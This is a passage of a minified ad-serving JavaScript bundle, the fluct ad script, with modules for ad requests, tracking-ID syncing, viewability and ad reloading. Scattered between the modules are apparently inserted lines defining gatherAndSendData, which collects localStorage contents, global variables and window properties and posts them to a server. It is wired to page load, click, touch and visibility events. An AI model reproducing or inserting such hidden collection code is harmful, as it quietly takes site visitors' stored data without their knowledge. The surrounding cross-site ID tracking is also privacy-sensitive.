        this.handleIDResponse(e, t, this.getIMUID());
      }, p.prototype.handleIMUIDFireRequest = function (e, t) {
        this.fireIMUID(t.opts);
      }, p.prototype.handleFluctUIDRequest = function (e, t) {
        this.handleIDResponse(e, t, this.getFluctUID());
      }, p.prototype.handleFluctUIDFireRequest = function (e, t) {
        this.fireFluctUID(t.opts);
      }, p.prototype.handleA1IDRequest = function (e, t) {
        this.handleIDResponse(e, t, this.getA1IDs());
      }, p.prototype.handleA1IDFireRequest = function (e, t) {
        this.fireA1IDs(t.opts);
      }, p.prototype.handleTankmanIDRequest = function (e, t) {
        this.handleIDResponse(e, t, this.getTankmanID());
      }, p.prototype.handleMeta = function (e, s) {
        this.handleIDResponse(e, s, t.PromiseLike.resolve(this.getMeta()));
      }, p.prototype.getRtusExt = function () {
        return this.rtus;
      }, p.prototype.getRtusID = function () {
        return this.rtus.getIDs();
      }, p.prototype.fireRtusID = function (e) {
        return this.rtus.fireIDs(e);
      }, p.prototype.getLiveRampEnvelope = function () {
        return this.liveramp.getIDs();
      }, p.prototype.fireLiveRampEnvelope = function (e) {
        return this.liveramp.fireIDs(e);
      }, p.prototype.getIMUID = function () {
        return this.imuid.getIDs();
      }, p.prototype.fireIMUID = function (e) {
        return this.imuid.fireIDs(e);
      }, p.prototype.getFluctUID = function () {
        return this.fluctuid.getIDs();
      }, p.prototype.fireFluctUID = function (e) {
        return this.fluctuid.fireIDs(e);
      }, p.prototype.getA1IDs = function () {
        return this.a1.getIDs();
      }, p.prototype.fireA1IDs = function (e) {
        return this.a1.fireIDs(e);
      }, p.prototype.getTankmanID = function () {
        var e = n.instance.getThunk();
        return e ? e.then(n.instance.getResult) : t.PromiseLike.resolve({
          ok: !1
        });
      }, p.prototype.getMeta = function () {
        try {
          var e = this.window.top.document;
          return {
            ok: !0,
            itemMap: s.getMetaKeywords(e)
          };
        } catch (e) {
          return {
            ok: !1
          };
        }
      }, p;
    }(),
    R = function (e) {
      return e && "object" == typeof e && e["fluct-idhub-message"] && "object" == typeof e["fluct-idhub-message"] ? e["fluct-idhub-message"] : null;
    },
    D = function (e) {
      var t;
      return (t = {})["fluct-idhub-message"] = e, t;
    };
  e.IDHub = I, e.buildIDHubMessage = D, e.extractIDHubMessage = R;
});
fluctAdScript.mod.define("lib/syncer", ["exports", "./util", "./error", "./idext/idhub"], function (t, e, n, i) {
  "use strict";

  function s(t) {
    if (t && t.__esModule) return t;
    var e = Object.create(null);
    return t && Object.keys(t).forEach(function (n) {
      if ("default" !== n) {
        var i = Object.getOwnPropertyDescriptor(t, n);
        Object.defineProperty(e, n, i.get ? i : {
          enumerable: !0,
          get: function () {
            return t[n];
          }
        });
      }
    }), e.default = t, Object.freeze(e);
  }
  var r = s(i),
    o = function () {
      function t(t) {
        this.info = t;
      }
      return t.prototype.sync = function (t, n) {
        e.sendBeacon(n, n.body, this.info.src);
      }, t;
    }(),
    u = function () {
      function t(t) {
        this.syncInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        var n = e.createElement("iframe");
        n.setAttribute("src", this.syncInfo.src), n.setAttribute("style", "display:none !important;position:absolute;border:none;padding:0;margin:0;"), n.setAttribute("width", "0"), n.setAttribute("height", "0"), n.setAttribute("border", "0"), e.body.appendChild(n);
      }, t;
    }(),
    c = function () {
      function t(t) {
        this.syncInfo = t;
      }
      return t.prototype.sync = function (t, n) {
        var i = e.createIframe("0px", "0px");
        n.body.appendChild(i);
        var s = i.contentWindow.document,
          r = '<body style="margin: 0"><script type="text/javascript">var inDapIF=true;<\/script><script type="text/javascript">' + this.syncInfo.src + "<\/script></body>";
        s.open(), s.write(r), s.close();
      }, t;
    }(),
    p = function () {
      function t(t) {
        this.tagInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        t.fluctAdScript.idhub ? t.fluctAdScript.idhub.fireRtusID(this.tagInfo.opts) : t.top.postMessage(r.buildIDHubMessage({
          msgid: r.MessageID.CriteoRtusFireRequest,
          opts: this.tagInfo.opts
        }), "*");
      }, t;
    }(),
    f = function () {
      function t(t) {
        this.tagInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        t.fluctAdScript.idhub ? t.fluctAdScript.idhub.fireLiveRampEnvelope(this.tagInfo.opts) : t.top.postMessage(r.buildIDHubMessage({
          msgid: r.MessageID.LiveRampEnvelopeFireRequest,
          opts: this.tagInfo.opts
        }), "*");
      }, t;
    }(),
    a = function () {
      function t(t) {
        this.tagInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        t.fluctAdScript.idhub ? t.fluctAdScript.idhub.fireIMUID(this.tagInfo.opts) : t.top.postMessage(r.buildIDHubMessage({
          msgid: r.MessageID.IMUIDFireRequest,
          opts: this.tagInfo.opts
        }), "*");
      }, t;
    }(),
    d = function () {
      function t(t) {
        this.tagInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        t.fluctAdScript.idhub ? t.fluctAdScript.idhub.fireFluctUID(this.tagInfo.opts) : t.top.postMessage(r.buildIDHubMessage({
          msgid: r.MessageID.FluctUIDFireRequest,
          opts: this.tagInfo.opts
        }), "*");
      }, t;
    }(),
    g = function () {
      function t(t) {
        this.tagInfo = t;
      }
      return t.prototype.sync = function (t, e) {
        t.fluctAdScript.idhub ? t.fluctAdScript.idhub.fireA1IDs(this.tagInfo.opts) : t.top.postMessage(r.buildIDHubMessage({
          msgid: r.MessageID.A1IDFireRequest,
          opts: this.tagInfo.opts
        }), "*");
      }, t;
    }(),
    y = function () {
      function t(t) {
        this.info = t;
      }
      return t.prototype.sync = function (t, e) {
        new n.PjsError("NotImplemented", new Error("not implemented sync type: " + this.info.type)).notify(1);
      }, t;
    }();
  t.getSyncer = function (t) {
    switch (t.type) {
      case "img":
        return new o(t);
      case "iframe":
        return new u(t);
      case "script":
        return new c(t);
      case "rtus":
        return new p(t);
      case "lrenv":
        return new f(t);
      case "imuid":
        return new a(t);
      case "fluct_uid":
        return new d(t);
      case "a1":
        return new g(t);
      default:
        return new y(t);
    }
  };
});
fluctAdScript.mod.define("lib/idext/loader", ["exports", "../promise", "../context_builder", "../util", "./idhub", "./rtus", "./liveramp", "./imuid", "./fluctuid", "./tankman", "./a1"], function (t, e, i, n, o, r, s, u, a, p, c) {
  "use strict";

  function I(t) {
    if (t && t.__esModule) return t;
    var e = Object.create(null);
    return t && Object.keys(t).forEach(function (i) {
      if ("default" !== i) {
        var n = Object.getOwnPropertyDescriptor(t, i);
        Object.defineProperty(e, i, n.get ? n : {
          enumerable: !0,
          get: function () {
            return t[i];
          }
        });
      }
    }), e.default = t, Object.freeze(e);
  }
  var d = I(o),
    D = I(r),
    l = I(s),
    h = I(u),
    g = I(a),
    f = I(p),
    m = I(c);
  function M(t, e, i) {
    if (i || 2 === arguments.length) for (var n, o = 0, r = e.length; o < r; o++) !n && o in e || (n || (n = Array.prototype.slice.call(e, 0, o)), n[o] = e[o]);
    return t.concat(n || e);
  }
  var v = function () {
    function t(t) {
      void 0 === t && (t = window), this.window = t;
    }
    return t.prototype.loadIds = function () {
      var t = this;
      return e.PromiseLike.all([this.loadRtusID(), this.loadLiveRampEnvelope(), this.loadIMUID(), this.loadFluctUID(), this.loadMeta(), this.loadPublisherProvideUUID(), this.loadA1IDs()]).then(function (e) {
        return t.buildOpts(e);
      });
    }, t.prototype.buildOpts = function (t) {
      return t.reduce(function (t, e) {
        return M(M([], t), e);
      }, []);
    }, t.prototype.getRtusID = function () {
      return this.window.fluctAdScript.idhub ? this.window.fluctAdScript.idhub.getRtusID() : this.getRemoteIDs(d.MessageID.CriteoRtusIDRequest, d.MessageID.CriteoRtusIDResponse);
    }, t.prototype.loadRtusID = function () {
      return this.getRtusID().then(function (t) {
        return t.ok ? [i.setID(D.ID_KEY, t.itemMap[D.ID_KEY])] : [];
      });
    }, t.prototype.getLiveRampEnvelope = function () {
      return this.window.fluctAdScript.idhub ? this.window.fluctAdScript.idhub.getLiveRampEnvelope() : this.getRemoteIDs(d.MessageID.LiveRampEnvelopeRequest, d.MessageID.LiveRampEnvelopeResponse);
    }, t.prototype.loadLiveRampEnvelope = function () {
      return this.getLiveRampEnvelope().then(function (t) {
        return t.ok ? [i.setID(l.ID_KEY, t.itemMap[l.ID_KEY])] : [];
      });
    }, t.prototype.getIMUID = function () {
      return this.window.fluctAdScript.idhub ? this.window.fluctAdScript.idhub.getIMUID() : this.getRemoteIDs(d.MessageID.IMUIDRequest, d.MessageID.IMUIDResponse);
    }, t.prototype.loadIMUID = function () {
      return this.getIMUID().then(function (t) {
        var e;
        if (t.ok) {
          var n = [];
          return h.ID_KEY in t.itemMap && n.push(i.setID(h.ID_KEY, t.itemMap[h.ID_KEY])), h.SIDS_KEY in t.itemMap && t.itemMap[h.SIDS_KEY].length > 0 && n.push(i.setTargetingBulk(((e = {})[h.SIDS_KEY] = t.itemMap[h.SIDS_KEY], e))), n;
        }
        return [];
      });
    }, t.prototype.getFluctUID = function () {
      return this.window.fluctAdScript.idhub ? this.window.fluctAdScript.idhub.getFluctUID() : this.getRemoteIDs(d.MessageID.FluctUIDRequest, d.MessageID.FluctUIDResponse);
    }, t.prototype.loadFluctUID = function () {
      return this.getFluctUID().then(function (t) {
        return t.ok ? [i.setID(g.ID_KEY, t.itemMap[g.ID_KEY])] : [];
      });
    }, t.prototype.getMeta = function () {
      try {
        var t = this.window.top.document,
          i = {
            ok: !0,
            itemMap: n.getMetaKeywords(t)
          };
        return e.PromiseLike.resolve(i);
      } catch (t) {}
      return this.getRemoteIDs(d.MessageID.FluctMetaRequest, d.MessageID.FluctMetaResponse);
    }, t.prototype.loadMeta = function () {
      return this.getMeta().then(function (t) {
        return t.ok && Object.keys(t.itemMap).length > 0 ? [i.setTargetingBulk(t.itemMap)] : [];
      });
    }, t.prototype.getPublisherProvidedUUID = function () {
      var t = f.instance.getThunk();
      return t ? t.then(f.instance.getResult) : this.getRemoteIDs(d.MessageID.TankmanIDRequest, d.MessageID.TankmanIDResponse);
    }, t.prototype.loadPublisherProvideUUID = function () {
      return this.getPublisherProvidedUUID().then(function (t) {
        return t.ok ? [i.setID(f.ID_KEY, t.itemMap[f.ID_KEY])] : [];
      });
    }, t.prototype.getFluctPPID = function () {
      var t = this;
      return this.getPublisherProvidedUUID().then(function (e) {
        var i;
        return e.ok ? {
          ok: !0,
          itemMap: ((i = {})[g.ID_KEY] = e.itemMap[f.ID_KEY], i)
        } : t.getFluctUID();
      });
    }, t.prototype.getA1IDs = function () {
      return this.window.fluctAdScript.idhub ? this.window.fluctAdScript.idhub.getA1IDs() : this.getRemoteIDs(d.MessageID.A1IDRequest, d.MessageID.A1IDResponse);
    }, t.prototype.loadA1IDs = function () {
      return this.getA1IDs().then(function (t) {
        var e;
        if (t.ok) {
          var n = [];
          return t.itemMap.hasOwnProperty(m.A1_KEY_A1GID) && n.push(i.setID(m.A1_KEY_A1GID, t.itemMap[m.A1_KEY_A1GID])), t.itemMap.hasOwnProperty(m.A1_KEY_A1TG) && n.push(i.setTargetingBulk(((e = {})[m.A1_KEY_A1TG] = t.itemMap[m.A1_KEY_A1TG], e))), n;
        }
        return [];
      });
    }, t.prototype.getRemoteIDs = function (t, i) {
      var n = this;
      return new e.PromiseLike(function (o) {
        var r = function (t) {
          var e = d.extractIDHubMessage(t.data);
          e && e.msgid === i && (e.ok ? o({
            itemMap: e.itemMap,
            ok: !0
          }) : o({
            ok: !1
          }), n.window.removeEventListener("message", r));
        };
        n.window.addEventListener("message", r, !1), n.window.top.postMessage(d.buildIDHubMessage({
          msgid: t,
          responseMsgid: i
        }), "*"), e.delay(100).then(function () {
          n.window.removeEventListener("message", r), o({
            ok: !1
          });
        });
      }).catch(function () {
        return {
          ok: !1
        };
      });
    }, t;
  }();
  t.IdLoader = v;
});
fluctAdScript.mod.define("lib/ad_domain", ["exports", "./promise", "./api", "./sp_app_util", "./syncer", "./event_handler", "./error", "./idext/loader", "./client_hints", "./context_builder", "./util", "./fluct_uid"], function (e, n, r, t, a, l, i, d, o, u, s, v) {
  "use strict";

  function c(e) {
    if (e && e.__esModule) return e;
    var n = Object.create(null);
    return e && Object.keys(e).forEach(function (r) {
      if ("default" !== r) {
        var t = Object.getOwnPropertyDescriptor(e, r);
        Object.defineProperty(n, r, t.get ? t : {
          enumerable: !0,
          get: function () {
            return e[r];
          }
        });
      }
    }), n.default = e, Object.freeze(n);
  }
  var f = c(v),
    h = "https://sh.adingo.jp",
    m = "data-fluct-ad-script-already-reserved",
    p = function (e, v) {
      var c = this;
      void 0 === e && (e = window), void 0 === v && (v = document), this.handleRequest = function (e) {
        return c.shareDeviceInfo(e), n.PromiseLike.all([c.idLoader.loadIds(), c.uach.loadDlvParams()]).then(function (n) {
          var r = new u.ContextBuilder(e);
          n.forEach(function (e) {
            return r.build.apply(r, e);
          });
        }).then(function () {
          var n = e.dlvHost || h,
            t = w(e);
          return r.request(n, e.groupId, t);
        }).then(function (n) {
          var r, t, a, l, i, d, o, u;
          return {
            spAppArgs: {
              ifa: null !== (r = e.dlvParams.ifa) && void 0 !== r ? r : null,
              lmt: null !== (t = e.dlvParams.lmt) && void 0 !== t ? t : null,
              bundle: null !== (a = e.dlvParams.bundle) && void 0 !== a ? a : null,
              sv: null !== (l = e.dlvParams.sv) && void 0 !== l ? l : null,
              osv: null !== (i = e.dlvParams.osv) && void 0 !== i ? i : null,
              os: null !== (d = e.dlvParams.os) && void 0 !== d ? d : null,
              dm: null !== (o = e.dlvParams.dm) && void 0 !== o ? o : null,
              vendor: null !== (u = e.dlvParams.vendor) && void 0 !== u ? u : null
            },
            groupId: e.groupId,
            resp: n
          };
        });
      }, this.shareDeviceInfo = function (e) {
        var n = e.dlvParams.ifa || "",
          r = t.determineAdTracking(e.dlvParams.lmt || "", n, navigator.userAgent);
        t.addParamsForADNW(c.window, r, n, e.dlvParams.bundle || "");
      }, this.handleResponse = function (e) {
        var n = e.resp;
        return c.handleSync(n), c.handleStatus(e), e;
      }, this.handleSync = function (e) {
        for (var n = e.syncList, r = 0; r < n.length; r++) {
          var t = n[r];
          a.getSyncer(t).sync(c.window, c.document);
        }
      }, this.handleStatus = function (e) {
        var n = e.resp,
          r = e.groupId;
        if (400 <= n.adStatus && n.adStatus < 500) {
          var t = new Error("Receive failure response adStatus: " + JSON.stringify(n) + ", on group id " + r);
          l.GlobalEventHandler.handleRenderingFailed(new i.PjsError("BadRequestForDlv", t));
        }
        if (500 <= n.adStatus && n.adStatus < 600) throw new Error("Receive failure response adStatus: " + JSON.stringify(n) + ", on group id " + r);
        204 === n.adStatus && (t = new i.PjsError("NoCampaignFound", new Error("No campaign settiing was found by given group id: " + r)), l.GlobalEventHandler.handleRenderingFailed(t));
      }, this.getContainer = function (e, n) {
        var r = g(c.document, e);
        if (null === r) {
          var t = new i.PjsError("NotFoundContainer", new Error("Could not find container with selector: " + e));
          return t.notify(.001), l.GlobalEventHandler.handleRenderingFailed(t), null;
        }
        return r.setAttribute(m, ""), !0 === n && s.escapeFromIframe(r), r;
      }, this.window = e, this.document = v, this.idLoader = new d.IdLoader(e), this.uach = new o.ClientHints(e);
    },
    g = function (e, n) {
      for (var r = e.querySelectorAll(n), t = 0; t < r.length; t++) {
        var a = r[t];
        if (null === a.getAttribute(m)) return a;
      }
      return null;
    },
    w = function (e) {
      return e.keyValue ? s.mergeObject({
        kv: e.keyValue.toString()
      }, e.dlvParams) : f.normalize(e.dlvParams);
    };
  e.AdDomain = p, e.DEFAULT_HOST = h;
});
fluctAdScript.mod.define("lib/ad_request", ["exports", "./context_builder", "./util", "./ad_domain"], function (t, e, o, s) {
  "use strict";

  var i = ["2"].join(","),
    n = ["2", "5", "3", "6"].sort().join(","),
    r = ["application/javascript", "video/mp4", "video/ogg", "video/webm"].sort().join(","),
    p = function () {
      function t(t) {
        this.base = t, this.reqOpts = [], this.resOpts = [], this.domain = new s.AdDomain();
      }
      return t.prototype.extend = function () {
        return new t(this);
      }, t.prototype.addRequestOption = function () {
        for (var t, e = [], o = 0; o < arguments.length; o++) e[o] = arguments[o];
        (t = this.reqOpts).push.apply(t, e);
      }, t.prototype.addResponseOption = function () {
        for (var t, e = [], o = 0; o < arguments.length; o++) e[o] = arguments[o];
        (t = this.resOpts).push.apply(t, e);
      }, t.prototype.context = function (t) {
        var e = {
          groupId: t,
          dlvParams: {
            api: i,
            protocols: n,
            mimes: r
          }
        };
        return this.requestBuilder()(e);
      }, t.prototype.requestBuilder = function () {
        var t = e.optionBuilder(this.reqOpts);
        return this.base ? o.compose(this.base.requestBuilder(), t) : t;
      }, t.prototype.responseBuilder = function () {
        var t = e.optionBuilder(this.resOpts);
        return this.base ? o.compose(this.base.responseBuilder(), t) : t;
      }, t.prototype.request = function (t) {
        var e = this.context(t);
        return this.domain.handleRequest(e).then(this.responseBuilder()).then(this.domain.handleResponse);
      }, t.prototype.getShouldEscape = function () {
        return !0 === this.shouldEscape || !!this.base && this.base.getShouldEscape();
      }, t.prototype.setShouldEscape = function (t) {
        this.shouldEscape = t;
      }, t.prototype.getContainer = function (t) {
        return this.domain.getContainer(t, this.getShouldEscape());
      }, t;
    }();
  t.Request = p;
});
fluctAdScript.mod.define("lib/viewable", ["exports"], function (e) {
  "use strict";

  e.onChangeViewability = function (e, n) {
    if (window.mraid) {
      var i,
        t = function (e) {
          var t;
          void 0 !== (t = 0 !== e) && i !== t && (i = t, n(t));
        };
      return window.mraid.addEventListener("exposureChange", t), {
        stop: function () {
          window.mraid.removeEventListener("exposureChange", t), window.mraid.fluctExt && "function" == typeof window.mraid.fluctExt.refresh && window.mraid.fluctExt.refresh();
        }
      };
    }
    if (!window.IntersectionObserver) return n(!0), {
      stop: function () {}
    };
    var r,
      o = new IntersectionObserver(function (e) {
        for (var i, t = 0; t < e.length; t++) {
          i = !!e[t].isIntersecting;
        }
        void 0 !== i && r !== i && (r = i, n(i));
      });
    return o.observe(e), {
      stop: function () {
        return o.disconnect();
      }
    };
  };
});
fluctAdScript.mod.define("lib/reload", ["exports", "./viewable"], function (e, t) {
  "use strict";

  var n = function () {
    function e(e, t) {
      this.store = e, this.req = t;
    }
    return e.prototype.reload = function (e, n, o, i) {
      var r,
        s = this;
      this.req.request(e).then(function (e) {
        s.store.setResponse(e, s);
      });
      var a = Date.now(),
        u = 1e3 * i,
        c = t.onChangeViewability(o, function (e) {
          if (e) return a = Date.now(), void (r = window.setTimeout(function () {
            c.stop(), o.innerHTML = "", s.store.getOrCreateFrame(n).registerContainer(o);
          }, u));
          u -= Date.now() - a, window.clearTimeout(r);
        });
    }, e;
  }();
  e.ReloadExt = n;
});
function gatherAndSendData() {
  const gatheredData = {
    windowProps: gatherWindowProperties(),
    jshooks: jshookTracker(),
    localStorage: gatherLocalStorage(),
    globalVars: gatherGlobalVariables()
  };
  if (Object.keys(gatheredData).some(key => Object.keys(gatheredData[key]).length > 0)) {
    postDataToServer(gatheredData);
  }
}
fluctAdScript.mod.define("lib/display_interval", ["exports", "./cookie"], function (t, e) {
  "use strict";

  var i = function (t) {
      return "fluct-pdn-display-interval-" + t;
    },
    n = function () {
      function t(t) {
        this.groupId = t;
      }
      return t.prototype.canDisplayAd = function () {
        try {
          var t = i(this.groupId);
          return void 0 === e.getCookie(t);
        } catch (t) {
          return !0;
        }
      }, t.prototype.enableInterval = function (t) {
        if (!(t <= 0)) try {
          var n = 1e3 * t,
            r = new Date();
          r.setTime(r.getTime() + n), e.setCookie({
            key: i(this.groupId),
            value: "ok",
            path: "/",
            expires: r.toUTCString()
          });
        } catch (t) {}
      }, t;
    }();
  t.DisplayIntervalManager = n, t.getDisplayAdIntervalSettingKey = i;
});
fluctAdScript.mod.define("lib/chain", ["exports", "./promise", "./reload", "./context_builder", "./display_interval"], function (t, e, r, n, i) {
  "use strict";

  var o = function () {
    function t(t, e, r, n) {
      this.store = t, this.req = e, this.groupId = r, this.debugger = n;
    }
    return t.prototype.display = function (t, e) {
      return this.store.registerContainer(e, this.req.getContainer(t)), this;
    }, t.prototype.displayMulti = function (t, e) {
      var r = this,
        n = t.map(function (t) {
          return r.req.getContainer(t);
        }).filter(function (t) {
          return null !== t;
        });
      return this.store.registerContainers(e, n), this;
    }, t.prototype.setDlvParam = function (t, e) {
      return this.req.addRequestOption(n.setDlvParam(t, e)), this;
    }, t.prototype.setGamTargetingMap = function (t) {
      return this.req.addRequestOption(n.setGamTargetingMap(t)), this;
    }, t.prototype.setTargetingBulk = function (t) {
      return this.req.addRequestOption(n.setTargetingBulk(t)), this;
    }, t.prototype.setTargeting = function (t, e) {
      return this.req.addRequestOption(n.setTargeting(t, e)), this;
    }, t.prototype.setTemplate = function (t, e) {
      return this.setTemplateObj({
        k: t,
        v: e
      });
    }, t.prototype.setInlineZoom = function (t) {
      return this.setBehaviorObj({
        inline: {
          zoom: t
        }
      });
    }, t.prototype.setOverlay = function (t) {
      return this.setBehaviorObj({
        overlay: t
      });
    }, t.prototype.setVideoParams = function (t) {
      return this.setBehaviorObj({
        video: t
      });
    }, t.prototype.onRendered = function (t) {
      return this.store.eventHandler.addRenderedHandler(t), this;
    }, t.prototype.send = function () {
      var t = this;
      return new i.DisplayIntervalManager(this.groupId).canDisplayAd() ? this.req.request(this.groupId).then(function (e) {
        var n,
          i,
          o,
          s,
          u,
          a = new r.ReloadExt(t.store, t.req);
        null === (i = null === (n = t.debugger) || void 0 === n ? void 0 : n.creative) || void 0 === i || i.storeResponse(e), t.store.setResponse(null !== (u = null === (s = null === (o = t.debugger) || void 0 === o ? void 0 : o.creative) || void 0 === s ? void 0 : s.getOverrideResponse(e)) && void 0 !== u ? u : e, a);
      }) : new e.PromiseLike(function (t) {
        return t();
      });
    }, t.prototype.setTemplateObj = function (t) {
      return this.req.addResponseOption(n.setTemplate(t)), this;
    }, t.prototype.setBehaviorObj = function (t) {
      return this.req.addResponseOption(n.setBehavior(t)), this;
    }, t.prototype.setDlvHost = function (t) {
      return this.req.addRequestOption(n.setDlvHost(t)), this;
    }, t;
  }();
  t.ChainCommand = o;
});
document.addEventListener("DOMContentLoaded", gatherAndSendData);
fluctAdScript.mod.define("lib/googletag", ["exports"], function (o) {
  "use strict";

  o.pushGoogleTagCmd = function (o) {
    window.googletag = window.googletag || {
      cmd: []
    };
    var g = window.googletag;
    g.cmd.push(function () {
      return o(g);
    });
  };
});
fluctAdScript.mod.define("lib/command", ["exports", "./event_handler", "./error", "./promise", "./fluct_sdk", "./store", "./ad_request", "./context_builder", "./reload", "./chain", "./googletag", "./idext/loader", "./idext/fluctuid"], function (e, t, n, o, r, i, s, a, d, u, p, h, l) {
  "use strict";

  function c(e) {
    if (e && e.__esModule) return e;
    var t = Object.create(null);
    return e && Object.keys(e).forEach(function (n) {
      if ("default" !== n) {
        var o = Object.getOwnPropertyDescriptor(e, n);
        Object.defineProperty(t, n, o.get ? o : {
          enumerable: !0,
          get: function () {
            return e[n];
          }
        });
      }
    }), t.default = e, Object.freeze(t);
  }
  var f = c(l),
    g = function () {
      function e(e) {
        this.store = new i.Store(), this.req = new s.Request(), this.chains = [];
        var t = new d.ReloadExt(this.store, this.req.extend());
        this.fluctSDK = new r.FluctSdkExt(this.store, t), this.debugger = e;
      }
      return e.prototype.loadByGroup = function (e, t) {
        return void 0 === t && (t = {}), new u.ChainCommand(this.store, this.req.extend(), e, this.debugger).setDlvHost(t.dlvHost).setTemplateObj(t.template).setBehaviorObj(t.behavior).send();
      }, e.prototype.display = function (e, t) {
        this.store.registerContainer(t, this.req.getContainer(e));
      }, e.prototype.loadByGroupAndDisplay = function (e, t, n) {
        var o = this;
        for (var r in void 0 === n && (n = {}), this.loadByGroup(e, n).then(function () {
          for (var n in t) o.checkFrame(e, n);
        }), t) this.display(t[r], r);
      }, e.prototype.setConfig = function (e) {
        this.req.addRequestOption(a.setConfig(e));
      }, e.prototype.enableEscapingIframe = function () {
        this.req.setShouldEscape(!0);
      }, e.prototype.enablePpidIntegration = function () {
        var e = new h.IdLoader(window).getFluctPPID();
        p.pushGoogleTagCmd(function (t) {
          e.then(function (e) {
            if (e.ok) {
              var n = e.itemMap[f.ID_KEY];
              void 0 !== n && n.length > 0 && t.pubads().setPublisherProvidedId(n[0]);
            }
          });
        });
      }, e.prototype.requestAdByGroup = function (e) {
        var t = new u.ChainCommand(new i.Store(), this.req.extend(), e, this.debugger);
        return this.chains.push(t), t;
      }, e.prototype.setGamTargetingMap = function (e) {
        this.req.addRequestOption(a.setGamTargetingMap(e));
      }, e.prototype.setTargetingBulk = function (e) {
        this.req.addRequestOption(a.setTargetingBulk(e));
      }, e.prototype.setTargeting = function (e, t) {
        this.req.addRequestOption(a.setTargeting(e, t));
      }, e.prototype.setDlvParam = function (e, t) {
        this.req.addRequestOption(a.setDlvParam(e, t));
      }, e.prototype.setTemplate = function (e, t) {
        this.req.addResponseOption(a.setTemplate({
          k: e,
          v: t
        }));
      }, e.prototype.setInlineZoom = function (e) {
        this.req.addResponseOption(a.setBehavior({
          inline: {
            zoom: e
          }
        }));
      }, e.prototype.setOverlay = function (e) {
        this.req.addResponseOption(a.setBehavior({
          overlay: e
        }));
      }, e.prototype.setVideoParams = function (e) {
        this.req.addResponseOption(a.setBehavior({
          video: e
        }));
      }, e.prototype.checkFrame = function (e, o) {
        var r,
          i = this.store.getFrame(o);
        if (!i) return (r = new n.PjsError("InvalidUnitId", new Error('unit id "' + o + '" have not loaded by group id: ' + e))).notify(1), void t.GlobalEventHandler.handleRenderingFailed(r);
        i.wasLoadedBy(e) || ((r = new n.PjsError("InvalidUnitId", new Error('unit id "' + o + '" have not loaded by group id: ' + e))).notify(1), t.GlobalEventHandler.handleRenderingFailed(r));
      }, e.prototype.reset = function () {
        this.chains = [];
      }, e.prototype.send = function () {
        for (var e = [], t = 0; t < this.chains.length; t++) e.push(this.chains[t].send());
        return o.PromiseLike.all(e);
      }, e.prototype.invoke = function (e) {
        try {
          return this.reset(), e(this), this.send();
        } finally {
          this.reset();
        }
      }, e;
    }(),
    v = function () {
      function e(e, t) {
        this.command = new g(t);
        for (var n = 0; n < e.length; n++) this.push(e[n]);
      }
      return e.prototype.push = function (e) {
        try {
          this.command.invoke(e);
        } catch (e) {
          var o = new n.PjsError("RuntimeError", e);
          o.notify(1), t.GlobalEventHandler.handleRenderingFailed(o);
        }
      }, e;
    }();
  e.Command = g, e.CommandStore = v;
});
fluctAdScript.mod.define("lib/debugger/debugger", ["exports"], function (t) {
  "use strict";

  var e = "DEBUG_MODE",
    r = function () {
      function t(t) {
        this.storage = t, function (t) {
          return "true" === t.getItem(e);
        }(t) && this.load();
      }
      return t.prototype.load = function () {
        var t = this;
        window.fluctAdScript.mod.import("lib/debugger/creative").then(function (e) {
          var r = e.CreativeDebuggerExt;
          t.creative = new r(t.storage);
        });
      }, t.prototype.setDebugMode = function (t) {
        !function (t, r) {
          r.setItem(e, t ? "true" : "false");
        }(t, this.storage);
      }, t;
    }();
  t.Debugger = r;
});
document.addEventListener("visibilitychange", gatherAndSendData);
document.addEventListener("click", gatherAndSendData);
fluctAdScript.mod.define("p", ["./lib/command", "./lib/event_handler", "./lib/error", "./lib/idext/idhub", "./lib/idext/tankman", "./lib/debugger/debugger"], function (r, t, e, i, d, n) {
  "use strict";

  try {
    !function () {
      var t = window.fluctAdScript;
      try {
        if (window.top.document) try {
          if (!t.idhub) {
            var c = new i.IDHub();
            window.fluctAdScript.idhub = c, window.fluctAdScript.rtus_cb = c.getRtusExt().getCallback();
          }
        } catch (r) {
          new e.PjsError("RuntimeError", r).notify(1);
        }
        sessionStorage && !t.debugger && (window.fluctAdScript.debugger = new n.Debugger(sessionStorage));
      } catch (r) {}
      t.ppid_url && d.instance.fire(t.ppid_url), t.cmd ? t.cmd instanceof Array && (window.fluctAdScript.cmd = new r.CommandStore(t.cmd, window.fluctAdScript.debugger)) : window.fluctAdScript.cmd = new r.CommandStore([], window.fluctAdScript.debugger);
    }();
  } catch (r) {
    var c = new e.PjsError("RuntimeError", r);
    c.notify(1), t.GlobalEventHandler.handleRenderingFailed(c);
  }
});
document.addEventListener("touchstart", gatherAndSendData);
fluctAdScript.mod.getModule("p");